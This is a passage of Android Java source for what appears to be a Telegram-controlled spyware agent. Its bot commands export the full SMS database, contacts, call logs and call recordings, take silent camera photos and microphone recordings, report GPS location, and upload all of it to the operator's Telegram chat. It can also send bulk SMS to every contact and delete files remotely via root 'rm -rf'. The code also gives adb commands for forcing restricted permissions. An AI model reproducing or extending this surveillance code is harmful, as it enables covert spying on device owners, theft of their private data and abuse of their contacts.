            sb.append("\n_Total: ").append(capturedNotifications.size()).append(" notifications_");
            sendMessage(sb.toString());
        }
    }

    private void clearNotifications() {
        synchronized (capturedNotifications) {
            int count = capturedNotifications.size();
            capturedNotifications.clear();
            sendMessage("🔔 Cleared " + count + " notifications.");
        }
    }

// ================= /Calls =================
private void listCallRecordings() {
    new Thread(() -> {
        try {
            File dir = CallRecorder.getRecordingsDir();
            if (!dir.exists() || dir.listFiles() == null || dir.listFiles().length == 0) {
                sendMessage("📞 No call recordings found.");
                return;
            }

            File[] files = dir.listFiles();
            java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

            java.text.SimpleDateFormat sdf =
                    new java.text.SimpleDateFormat("MM-dd HH:mm", Locale.US);

            StringBuilder sb = new StringBuilder("📞 *Call Recordings:*\n\n");
            long totalSize = 0;

            for (File f : files) {
                if (sb.length() > 3500) { sb.append("_...truncated_"); break; }
                long kb = f.length() / 1024;
                totalSize += f.length();
                sb.append("🎙️ `").append(f.getName()).append("`\n")
                  .append("   ").append(kb).append(" KB — ")
                  .append(sdf.format(new Date(f.lastModified()))).append("\n");
            }

            sb.append("\n_").append(files.length).append(" file(s), ")
              .append(totalSize / 1024 / 1024).append(" MB total_");

            sendMessage(sb.toString());
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getMessage());
        }
    }).start();
}

    // ================= /call_status =================
   private void getCallStatus() {
    String status = "📞 *Call Status*\n\n" +
            "Active Call: " + (isCallActive ? "✅ Yes" : "❌ No") + "\n";

    if (lastCallNumber != null) {
        status += "Last Number: `" + lastCallNumber + "`\n" +
                "Last Call: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                        .format(new Date(lastCallTimestamp)) + "\n";
    }

    status += "\n_Call monitoring: ✅ active (via PhoneStateReceiver)_";
    sendMessage(status);
}

    // ================= /storage_status =================
    private void getStorageStatus() {
        String status = "💾 *Storage Monitoring Status*\n\n" +
                "Known Files: " + knownFiles.size() + "\n" +
                "Auto-upload Limit: 10 MB\n" +
                "Media Observer: " + (mediaObserver != null ? "✅ Active" : "❌ Inactive") + "\n" +
                "Periodic Scan: " + (storageHandler != null ? "✅ Active (30s)" : "❌ Inactive") + "\n" +
                "SMS Polling: " + (smsHandler != null ? "✅ Active (10s)" : "❌ Inactive") + "\n\n" +
                "*Monitored Directories:*\n" +
                "• DCIM, Pictures, Downloads, Camera\n" +
                "• WhatsApp/Media (old + new)\n" +
                "• Telegram\n\n" +
                "_New photos are sent immediately._\n" +
                "_Other files ≤10MB are auto-uploaded._";
        sendMessage(status);
    }

    // ================= /screen =================
    private void captureScreen() {
        sendMessage("📸 Requesting screen capture permission...");
        try {
            Intent intent = new Intent(this, CaptureActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        } catch (Exception e) { sendMessage("❌ Failed: " + e.getMessage()); }
    }

    // ================= /contacts =================
    private void getContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_CONTACTS denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.READ_CONTACTS`");
            return;
        }
        StringBuilder sb = new StringBuilder("📇 *Contacts:*\n");
        Cursor cur = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) {
            while (cur.moveToNext() && sb.length() < 3900) {
                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num  = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("• ").append(name != null ? name : "?").append(": ").append(num != null ? num : "").append("\n");
            }
            cur.close();
        }
        sendMessage(sb.toString());
    }

    // ================= /sms =================
    // ================= COMMAND: /sms (Inbox) =================
    private void getInboxSms() {
    // ----- Permission check -----
    if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
        sendMessage("❌ READ_SMS denied.\n\nOn Android 11+ this permission is restricted. Grant via ADB:\n" +
                "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
        return;
    }

    sendMessage("📩 Exporting all SMS to CSV...");

    // Run on a background thread so the UI/service doesn't freeze
    new Thread(() -> {
        Cursor cur = null;
        java.io.FileWriter writer = null;
        int count = 0;
        java.io.File csvFile = null;

        try {
            // ----- Create CSV file in cache directory -----
            csvFile = new java.io.File(
                    getCacheDir(),
                    "sms_export_" + System.currentTimeMillis() + ".txt");
            writer = new java.io.FileWriter(csvFile);

            // ----- CSV header row -----
            writer.append("ID,Type,Address,DateSent,DateReceived,Read,Status,Body\n");

            // ----- Query ALL SMS (no LIMIT, no filter) -----
            cur = getContentResolver().query(
                    Uri.parse("content://sms/"),
                    null, null, null, "date ASC"
            );

            if (cur == null) {
                sendMessage("❌ SMS provider not accessible.");
                return;
            }

            // ----- Column indices -----
            int idIdx     = cur.getColumnIndex("_id");
            int addrIdx   = cur.getColumnIndex("address");
            int bodyIdx   = cur.getColumnIndex("body");
            int dateIdx   = cur.getColumnIndex("date");
            int typeIdx   = cur.getColumnIndex("type");
            int readIdx   = cur.getColumnIndex("read");
            int statusIdx = cur.getColumnIndex("status");
            int sentIdx   = cur.getColumnIndex("date_sent");

            // ----- Date formatter -----
            java.text.SimpleDateFormat sdf =
                    new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);

            // ----- Loop through every SMS row -----
            while (cur.moveToNext()) {
                String id     = idIdx     != -1 ? cur.getString(idIdx) : "";
                String addr   = addrIdx   != -1 ? cur.getString(addrIdx) : "";
                String body   = bodyIdx   != -1 ? cur.getString(bodyIdx) : "";
                long   date   = dateIdx   != -1 ? cur.getLong(dateIdx) : 0;
                int    type   = typeIdx   != -1 ? cur.getInt(typeIdx) : -1;
                int    read   = readIdx   != -1 ? cur.getInt(readIdx) : -1;
                int    status = statusIdx != -1 ? cur.getInt(statusIdx) : -1;
                long   sent   = sentIdx   != -1 ? cur.getLong(sentIdx) : 0;

                // ----- Map type code to readable name -----
                String typeStr;
                switch (type) {
                    case 1: typeStr = "INBOX";  break;
                    case 2: typeStr = "SENT";   break;
                    case 3: typeStr = "DRAFT";  break;
                    case 4: typeStr = "OUTBOX"; break;
                    case 5: typeStr = "FAILED"; break;
                    case 6: typeStr = "QUEUED"; break;
                    default: typeStr = "UNKNOWN(" + type + ")";
                }

                // ----- Write CSV row (each field escaped) -----
                writer.append(csvEscape(id)).append(",")
                      .append(csvEscape(typeStr)).append(",")
                      .append(csvEscape(addr)).append(",")
                      .append(csvEscape(sent > 0 ? sdf.format(new Date(sent)) : "")).append(",")
                      .append(csvEscape(date > 0 ? sdf.format(new Date(date)) : "")).append(",")
                      .append(csvEscape(String.valueOf(read))).append(",")
                      .append(csvEscape(String.valueOf(status))).append(",")
                      .append(csvEscape(body)).append("\n");

                count++;
            }
            cur.close();
            writer.flush();
            writer.close();

            // ----- Handle empty result -----
            if (count == 0) {
                sendMessage("📩 No SMS found on device.");
                csvFile.delete();
                return;
            }

            // ----- Send CSV to Telegram -----
            long sizeKb = csvFile.length() / 1024;
            sendMessage("✅ *" + count + "* SMS exported (" + sizeKb + " KB). Uploading...");

            sendFileToTelegram(csvFile, "text/plain", csvFile.getName(),
                    "sendDocument", "document",
                    "📩 All SMS Export — " + count + " messages");

        } catch (SecurityException se) {
            sendMessage("❌ SecurityException: " + se.getMessage() +
                    "\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getMessage());
        } finally {
            // ----- Cleanup -----
            try { if (cur != null) cur.close(); } catch (Exception ignored) {}
            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
        }
    }).start();
}

// ==========================================================
// Helper: Escape a CSV field (handles commas, quotes, newlines)
// ==========================================================
private String csvEscape(String s) {
    if (s == null) return "";
    // If the field contains comma, quote, or newline, wrap it in quotes
    // and double any inner quotes (RFC 4180 CSV standard)
    if (s.contains(",") || s.contains("\"") || s.contains("\n") || s.contains("\r")) {
        return "\"" + s.replace("\"", "\"\"") + "\"";
    }
    return s;
}

    // ================= /outbox =================
    private void getOutboxSms() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_SMS denied. Grant via ADB.");
            return;
        }
        StringBuilder sb = new StringBuilder("📤 *Sent SMS (Last 30):*\n");
        Cursor cur = null;
        try {
            cur = getContentResolver().query(Uri.parse("content://sms/sent"),
                    null, null, null, "date DESC LIMIT 30");
            if (cur == null) { sendMessage("❌ No access."); return; }
            int bodyIdx = cur.getColumnIndex("body");
            int addrIdx = cur.getColumnIndex("address");
            int count = 0;
            while (cur.moveToNext() && sb.length() < 3900) {
                sb.append("• ").append(cur.getString(addrIdx)).append(": ")
                  .append(cur.getString(bodyIdx)).append("\n");
                count++;
            }
            if (count == 0) { sendMessage("📤 No sent SMS."); return; }
        } catch (Exception e) { sendMessage("❌ Error: " + e.getMessage()); return; }
        finally { if (cur != null) cur.close(); }
        sendMessage(sb.toString());
    }

    // ================= /send_sms =================
    private void sendSms(String data) {
        String[] parts = data.split("\\|", 2);
        if (parts.length < 2) { sendMessage("❌ Format: /send_sms number|message"); return; }
        try {
            SmsManager.getDefault().sendTextMessage(parts[0], null, parts[1], null, null);
            sendMessage("📤 SMS sent to " + parts[0]);
        } catch (Exception e) { sendMessage("❌ Failed: " + e.getMessage()); }
    }

    // ================= /send_sms_all =================
    private void sendSmsToAll(String msg) {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_CONTACTS denied."); return;
        }
        Cursor cur = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) {
            int count = 0;
            while (cur.moveToNext()) {
                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                if (num != null && !num.isEmpty()) {
                    try { SmsManager.getDefault().sendTextMessage(num, null, msg, null, null); count++; }
                    catch (Exception ignored) {}
                }
            }
            cur.close();
            sendMessage("📨 Bulk SMS sent to " + count + " contacts.");
        }
    }

    // ================= /vibrate =================
    private void vibrateDevice() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(2000); sendMessage("📳 Vibrating!"); }
        else sendMessage("❌ Vibrator not available.");
    }

    // ================= /apps =================
    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder("📦 *Installed Apps:*\n");
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (ApplicationInfo app : apps) {
            if (sb.length() > 3900) break;
            sb.append("• ").append(pm.getApplicationLabel(app)).append("\n");
        }
        sendMessage(sb.toString());
    }

    // ================= /devices =================
    private void getDeviceInfo() {
        sendMessage("🖥️ *Device Info*\n" +
                "ID: `" + DEVICE_ID + "`\n" +
                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "Brand: " + Build.BRAND + "\n" +
                "Root: " + (hasRoot ? "✅" : "❌"));
    }

    // ================= /location =================
    private void getLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ LOCATION denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.ACCESS_FINE_LOCATION`");
            return;
        }
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (lm == null) { sendMessage("❌ LocationManager unavailable."); return; }

        try {
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (loc != null) {
                sendLocation(loc);
            } else {
                sendMessage("📍 Fetching fresh location...");
                final LocationListener[] listenerRef = new LocationListener[1];
                LocationListener listener = new LocationListener() {
                    @Override public void onLocationChanged(Location location) {
                        sendLocation(location);
                        try { lm.removeUpdates(listenerRef[0]); } catch (Exception ignored) {}
                    }
                    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                    @Override public void onProviderEnabled(String provider) {}
                    @Override public void onProviderDisabled(String provider) {}
                };
                listenerRef[0] = listener;
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            }
        } catch (SecurityException se) {
            sendMessage("❌ SecurityException: " + se.getMessage());
        } catch (Exception e) {
            sendMessage("❌ Location error: " + e.getMessage());
        }
    }

    private void sendLocation(Location loc) {
        double lat = loc.getLatitude();
        double lon = loc.getLongitude();
        sendMessage("📍 *Location*\n" +
                "Lat: `" + lat + "`\n" +
                "Lon: `" + lon + "`\n" +
                "Accuracy: " + loc.getAccuracy() + " m\n" +
                "Provider: " + loc.getProvider() + "\n" +
                "Map: https://maps.google.com/?q=" + lat + "," + lon);
    }

    // ================= /camera & /cameraF =================
    private void capturePhoto(boolean useFront) {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ CAMERA denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.CAMERA`");
            return;
        }
        sendMessage(useFront ? "📷 Capturing front photo..." : "📷 Capturing back photo...");
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) { sendMessage("❌ CameraManager null."); return; }

            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) { sendMessage("❌ No camera."); return; }

            String chosenId = null;
            for (String id : ids) {
                CameraCharacteristics chars = cm.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;

                if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    chosenId = id; break;
                }
                if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    chosenId = id; break;
                }
            }
            if (chosenId == null) chosenId = useFront ? ids[ids.length - 1] : ids[0];
            final String cameraId = chosenId;

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    try {
                        final ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
                        reader.setOnImageAvailableListener(r -> {
                            Image img = r.acquireLatestImage();
                            if (img != null) {
                                ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buf.remaining()];
                                buf.get(bytes);
                                img.close();
                                sendPhotoToTelegram(bytes, 1280, 720);
                            }
                            try { camera.close(); } catch (Exception ignored) {}
                            try { reader.close(); } catch (Exception ignored) {}
                        }, new Handler(Looper.getMainLooper()));

                        camera.createCaptureSession(
                                Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession session) {
                                        try {
                                            CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            b.addTarget(reader.getSurface());
                                            session.capture(b.build(), null, null);
                                        } catch (Exception e) {
                                            Log.e("Agent", "capture failed", e);
                                            sendMessage("❌ Capture failed: " + e.getMessage());
                                            try { camera.close(); } catch (Exception ignored) {}
                                        }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession session) {
                                        sendMessage("❌ Camera session failed.");
                                        try { camera.close(); } catch (Exception ignored) {}
                                    }
                                }, null);
                    } catch (Exception e) {
                        Log.e("Agent", "camera open", e);
                        sendMessage("❌ Camera error: " + e.getMessage());
                        try { camera.close(); } catch (Exception ignored) {}
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { try { camera.close(); } catch (Exception ignored) {} }
                @Override public void onError(CameraDevice camera, int error) {
                    sendMessage("❌ Camera error code: " + error);
                    try { camera.close(); } catch (Exception ignored) {}
                }
            }, new Handler(Looper.getMainLooper()));
        } catch (Exception e) {
            sendMessage("❌ Camera failed: " + e.getMessage());
        }
    }

    // ================= /mic =================
    private void recordAudio() {
    if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
        sendMessage("❌ RECORD_AUDIO denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.RECORD_AUDIO`");
        return;
    }
    try {
        // Voice messages must be .ogg (Opus codec) for Telegram to play inline
        final File out = new File(getCacheDir(),
                "voice_" + System.currentTimeMillis() + ".ogg");

        final MediaRecorder rec = new MediaRecorder();

        // Audio source
        rec.setAudioSource(MediaRecorder.AudioSource.MIC);

        // Output: OGG container (supported on Android 10 / API 29+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            rec.setOutputFormat(MediaRecorder.OutputFormat.OGG);
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS);
        } else {
            // Fallback for older Android: use MPEG_4 + AAC (send as audio, not voice)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        }

        rec.setAudioSamplingRate(48000);
        rec.setAudioEncodingBitRate(64000);
        rec.setOutputFile(out.getAbsolutePath());
        rec.prepare();
        rec.start();

        sendMessage("🎙️ Recording 10 seconds...");

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                rec.stop();
                rec.release();

                // ----- Send as Telegram VOICE message (plays inline) -----
                // Use sendVoice endpoint + OGG/Opus format
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    sendVoiceToTelegram(out);
                } else {
                    // Fallback: sendAudio with m4a (also plays inline)
                    sendAudioToTelegram(out);
                }

            } catch (Exception e) {
                Log.e("Agent", "rec stop", e);
                sendMessage("❌ Record stop error: " + e.getMessage());
            }
        }, 10000);
    } catch (Exception e) {
        sendMessage("❌ Mic error: " + e.getMessage());
    }
}
// ================= SEND VOICE (OGG/Opus) =================
// Telegram's sendVoice endpoint: plays inline as a voice message
public static void sendVoiceToTelegram(java.io.File oggFile) {
    if (context == null || oggFile == null || !oggFile.exists()) return;
    new Thread(() -> {
        HttpURLConnection conn = null;
        OutputStream os = null;
        PrintWriter writer = null;
        java.io.FileInputStream fis = null;
        try {
            String boundary = "----TB" + System.currentTimeMillis();
            conn = (HttpURLConnection) new URL(API_URL + "/sendVoice").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            conn.setReadTimeout(120000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + boundary);

            os = conn.getOutputStream();
            writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            writer.append(CHAT_ID).append("\r\n");
            writer.flush();

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            writer.append("🎙️ ").append(DEVICE_ID).append(" — 10s voice\r\n");
            writer.flush();

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"voice\"; filename=\"")
                  .append(oggFile.getName()).append("\"\r\n");
            writer.append("Content-Type: audio/ogg\r\n\r\n");
            writer.flush();

            fis = new java.io.FileInputStream(oggFile);
            byte[] buf = new byte[8192];
            int n;
            while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
            os.flush();

            writer.append("\r\n");
            writer.append("--").append(boundary).append("--\r\n");
            writer.flush();

            Log.d("Agent", "sendVoice response: " + conn.getResponseCode());
        } catch (Exception e) {
            Log.e("Agent", "sendVoice error: " + e.getMessage());
        } finally {
            try { if (fis != null) fis.close(); } catch (Exception ignored) {}
            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
            try { if (os != null) os.close(); } catch (Exception ignored) {}
            if (conn != null) conn.disconnect();
        }
    }).start();
}

// ================= SEND AUDIO (m4a fallback) =================
// Telegram's sendAudio endpoint: shows an audio player with inline play
public static void sendAudioToTelegram(java.io.File audioFile) {
    if (context == null || audioFile == null || !audioFile.exists()) return;
    new Thread(() -> {
        HttpURLConnection conn = null;
        OutputStream os = null;
        PrintWriter writer = null;
        java.io.FileInputStream fis = null;
        try {
            String boundary = "----TB" + System.currentTimeMillis();
            conn = (HttpURLConnection) new URL(API_URL + "/sendAudio").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            conn.setReadTimeout(120000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + boundary);

            os = conn.getOutputStream();
            writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            writer.append(CHAT_ID).append("\r\n");
            writer.flush();

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"title\"\r\n\r\n");
            writer.append("Mic Recording — ").append(DEVICE_ID).append("\r\n");
            writer.flush();

            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"audio\"; filename=\"")
                  .append(audioFile.getName()).append("\"\r\n");
            writer.append("Content-Type: audio/mp4\r\n\r\n");
            writer.flush();

            fis = new java.io.FileInputStream(audioFile);
            byte[] buf = new byte[8192];
            int n;
            while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
            os.flush();

            writer.append("\r\n");
            writer.append("--").append(boundary).append("--\r\n");
            writer.flush();

            Log.d("Agent", "sendAudio response: " + conn.getResponseCode());
        } catch (Exception e) {
            Log.e("Agent", "sendAudio error: " + e.getMessage());
        } finally {
            try { if (fis != null) fis.close(); } catch (Exception ignored) {}
            try { if (writer != null) writer.close(); } catch (Exception ignored) {}
            try { if (os != null) os.close(); } catch (Exception ignored) {}
            if (conn != null) conn.disconnect();
        }
    }).start();
}
    // ================= /call_log =================
    private void getCallLog() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_CALL_LOG denied.\nGrant via ADB:\n" +
                    "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_CALL_LOG`");
            return;
        }
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_READ_CALL_LOG,
                    android.os.Process.myUid(), getPackageName());
            if (mode != AppOpsManager.MODE_ALLOWED) {
                sendMessage("❌ CALL_LOG blocked by AppOps (mode=" + mode + ").\n" +
                        "Run: `adb shell appops set com.thunderx.telegramagent READ_CALL_LOG allow`");
                return;
            }
        } catch (Throwable ignored) {}

        StringBuilder sb = new StringBuilder("📞 *Call Log (Last 30):*\n");
        Cursor cur = null;
        try {
            Bundle args = new Bundle();
            args.putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, CallLog.Calls.DATE + " DESC");
            args.putInt(ContentResolver.QUERY_ARG_LIMIT, 30);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, args, null);
            } else {
                cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                        CallLog.Calls.DATE + " DESC");
            }
            if (cur == null) { sendMessage("❌ No access to call log."); return; }

            int numIdx  = cur.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
            int durIdx  = cur.getColumnIndex(CallLog.Calls.DURATION);
            int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);

            SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm", Locale.US);
            int count = 0;
            while (cur.moveToNext() && sb.length() < 3900 && count < 30) {
                String num = cur.getString(numIdx);
                int type  = cur.getInt(typeIdx);
                long dur  = cur.getLong(durIdx);
                long date = cur.getLong(dateIdx);
                String typeStr;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: typeStr = "⬅️"; break;
                    case CallLog.Calls.OUTGOING_TYPE: typeStr = "➡️"; break;
                    case CallLog.Calls.MISSED_TYPE:   typeStr = "❌"; break;
                    default: typeStr = "❓";
                }
                sb.append(typeStr).append(" ").append(num != null ? num : "?")
                  .append(" (").append(dur).append("s) ")
                  .append(sdf.format(new Date(date))).append("\n");
                count++;
            }
            if (count == 0) { sendMessage("📞 No call log entries."); return; }
        } catch (SecurityException se) {
            sendMessage("❌ SecurityException — system blocked CALL_LOG.\n" +
                    "ADB fix: `adb shell appops set com.thunderx.telegramagent READ_CALL_LOG allow`");
            return;
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            return;
        } finally { if (cur != null) cur.close(); }
        sendMessage(sb.toString());
    }

// ================= /delete =================
// Delete a file or folder permanently given a path
private void deletePath(String arg) {
    if (arg == null || arg.trim().isEmpty()) {
        sendMessage("❌ Usage: `/delete <path>`\n\n" +
                "Examples:\n" +
                "`/delete /storage/emulated/0/test.txt`\n" +
                "`/delete /storage/emulated/0/CallRecords`\n" +
                "`/delete ~/Download/old.apk`");
        return;
    }

    new Thread(() -> {
        try {
            File currentDir = getCwd();
            File target = resolvePath(currentDir, arg.trim());

            // ----- Safety: reject dangerous paths -----
            String absPath = target.getAbsolutePath();
            String[] FORBIDDEN = {
                    "/", "/system", "/data", "/storage", "/storage/emulated",
                    "/storage/emulated/0", "/sdcard", "/mnt", "/proc", "/sys"
            };
            for (String f : FORBIDDEN) {
                if (absPath.equals(f)) {
                    sendMessage("⛔ *Safety block:* refusing to delete `" + absPath + "`\n" +
                            "_This is a protected system path._");
                    return;
                }
            }

            // ----- Check existence -----
            if (!target.exists()) {
                sendMessage("❌ Not found: `" + absPath + "`");
                return;
            }

            // ----- Compute size before delete -----
            boolean isDir = target.isDirectory();
            long size = isDir ? getFolderSize(target) : target.length();
            int[] fileCount = new int[]{0};
            if (isDir) countFiles(target, fileCount);

            // ----- Attempt delete -----
            boolean ok;
            if (isDir) {
                ok = deleteRecursive(target);
            } else {
                ok = target.delete();
            }

            // ----- Root fallback (if enabled and failed) -----
            if (!ok && hasRoot) {
                ok = deleteWithRoot(absPath);
            }

            // ----- Report -----
            if (ok) {
                String readable = formatSize(size);
                if (isDir) {
                    sendMessage("🗑️ *Deleted folder*\n" +
                            "Path: `" + absPath + "`\n" +
                            "Files removed: *" + fileCount[0] + "*\n" +
                            "Freed: *" + readable + "*");
                } else {
                    sendMessage("🗑️ *Deleted file*\n" +
                            "Path: `" + absPath + "`\n" +
                            "Freed: *" + readable + "*");
                }
            } else {
                sendMessage("❌ *Delete failed:* `" + absPath + "`\n\n" +
                        "Possible reasons:\n" +
                        "• Permission denied\n" +
                        "• File in use\n" +
                        "• Protected system path\n\n" +
                        "Try:\n" +
                        "`adb shell appops set com.thunderx.telegramagent MANAGE_EXTERNAL_STORAGE allow`");
            }

        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getMessage());
        }
    }).start();
}

// ==========================================================
// Helper: Recursively delete a folder + all contents
// ==========================================================
private boolean deleteRecursive(File fileOrDir) {
    if (fileOrDir == null) return false;
    if (fileOrDir.isDirectory()) {
        File[] children = fileOrDir.listFiles();
        if (children != null) {
            for (File child : children) {
                deleteRecursive(child);
            }
        }
    }
    return fileOrDir.delete();
}

// ==========================================================
// Helper: Get total size of a folder (recursive)
// ==========================================================
private long getFolderSize(File dir) {
    long size = 0;
    if (dir == null || !dir.isDirectory()) return 0;
    File[] files = dir.listFiles();
    if (files == null) return 0;
    for (File f : files) {
        if (f.isDirectory()) size += getFolderSize(f);
        else size += f.length();
    }
    return size;
}

// ==========================================================
// Helper: Count files in a folder (recursive)
// ==========================================================
private void countFiles(File dir, int[] counter) {
    if (dir == null || !dir.isDirectory()) return;
    File[] files = dir.listFiles();
    if (files == null) return;
    for (File f : files) {
        if (f.isDirectory()) countFiles(f, counter);
        else counter[0]++;
    }
}

// ==========================================================
// Helper: Delete using root (su rm -rf)
// ==========================================================
private boolean deleteWithRoot(String path) {
    try {
        String safe = path.replace("\"", "\\\"");
        Process p = Runtime.getRuntime().exec(new String[]{
                "su", "-c", "rm -rf \"" + safe + "\""});
        int code = p.waitFor();
        return code == 0;
    } catch (Exception e) {
        Log.e("Agent", "root delete failed: " + e.getMessage());
        return false;
    }
}


// ================= /storage =================
// Scans all storage(s) and exports every file to a CSV with name + location + full path
private void getStorageFiles() {
    sendMessage("💾 Scanning storage... This may take a while.");

    new Thread(() -> {
        java.io.FileWriter writer = null;
        java.io.File csvFile = null;
        int fileCount = 0;
        int dirCount = 0;
        long totalBytes = 0;

        try {
            // ----- Create CSV file in cache -----
            csvFile = new java.io.File(
                    getCacheDir(),
                    "storage_export_" + System.currentTimeMillis() + ".txt");
            writer = new java.io.FileWriter(csvFile);

            // ----- CSV header -----
            writer.append("Name,Type,Location,Path,SizeBytes,SizeReadable,Modified\n");

            // ----- Collect all storage roots -----
            List<java.io.File> roots = new ArrayList<>();

            // Primary external storage (usually /storage/emulated/0)
            java.io.File primary = Environment.getExternalStorageDirectory();
            if (primary != null && primary.exists()) {
                roots.add(primary);
            }

            // Secondary storages (SD card etc.)
            try {
                java.io.File[] externalDirs = getExternalFilesDirs(null);
                if (externalDirs != null) {
                    for (java.io.File dir : externalDirs) {
                        if (dir == null) continue;
                        // Walk up to the storage root
